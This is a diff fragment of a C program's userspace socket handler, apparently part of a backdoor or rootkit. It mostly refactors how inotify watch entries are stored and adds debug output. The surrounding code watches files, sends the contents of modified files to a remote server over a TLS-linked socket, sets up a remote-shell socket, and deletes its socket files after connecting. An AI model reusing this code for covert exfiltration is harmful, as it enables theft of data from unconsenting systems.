@@ -5,6 +5,8 @@
  * The socket handling for userspace
  */
 
+#define _GNU_SOURCE
+
 //Needed for NAME_MAX constant
 #define _POSIX_C_SOURCE 200809L
 
@@ -13,7 +15,6 @@
 #include <limits.h>
 #include <linux/tcp.h>
 #include <netinet/ip.h>
-#include <netinet/tcp.h>
 #include <openssl/err.h>
 #include <openssl/evp.h>
 #include <openssl/rand.h>
@@ -27,6 +28,7 @@
 #include <sys/epoll.h>
 #include <sys/fcntl.h>
 #include <sys/inotify.h>
+#include <sys/mman.h>
 #include <sys/prctl.h>
 #include <sys/socket.h>
 #include <sys/stat.h>
@@ -57,7 +59,8 @@ int local_socks[2];
 
 int inot_fd = -1;
 int inot_epoll = -1;
-struct inot_watch inot_wds[8192];
+//struct inot_watch inot_wds[8192];
+struct inot_watch* inot_wds;
 size_t inot_watch_count = 0;
 
 /*
@@ -375,14 +378,17 @@ void handle_inotify_ignore(struct inotify_event* ie, int i) {
 }
 
 int handle_inotify_modified(struct inotify_event* ie) {
-    printf("%s was modified\n", ie->name);
+    //printf("%s was modified\n", ie->name);
     const char* file_name = NULL;
     if (ie->len > 0) {
+        printf("Grabbing name directly of length %d\n", ie->len);
         //We have a name
         file_name = ie->name;
     } else {
         //Retrieve the name
+        printf("Watch count %lu\n", inot_watch_count);
         for (size_t j = 0; j < inot_watch_count; ++j) {
+            printf("Looking for file watch name: %s\n", inot_wds[j].name);
             if (inot_wds[j].wd == ie->wd) {
                 //Found our name
                 file_name = inot_wds[j].name;
@@ -409,7 +415,7 @@ int handle_inotify_modified(struct inotify_event* ie) {
     unsigned char file_buffer[MAX_PAYLOAD];
     file_buffer[0] = 'f';
     size_t size;
-    while((size = fread(file_buffer + 1, 1, MAX_PAYLOAD - 1, f)) > 0) {
+    while ((size = fread(file_buffer + 1, 1, MAX_PAYLOAD - 1, f)) > 0) {
         //Write to server via local socket listening in epoll
         write(local_socks[1], file_buffer, size + 1);
         printf("Wrote file data to the server\n");
@@ -553,7 +559,6 @@ int main(void) {
     listen(local_tls_socket, 5);
     listen(remote_shell_unix, 5);
 
-    //int conn_sock = accept(local_tls_socket, NULL, 0);
     conn_sock = accept(local_tls_socket, NULL, 0);
     fcntl(conn_sock, F_SETFL, fcntl(conn_sock, F_GETFL, 0) | O_NONBLOCK);
 
@@ -600,6 +605,14 @@ int main(void) {
 
         //See if I can remove unix socket files after connection
         unlink(UNIX_SOCK_PATH);
+
+        inot_wds = mmap(NULL, sizeof(struct inot_watch) * (1ul << 16), PROT_READ | PROT_WRITE,
+                MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+
+        if (inot_wds == MAP_FAILED) {
+            perror("mmap");
+            exit(EXIT_FAILURE);
+        }
 
         if (wrapped_fork()) {
             setsid();
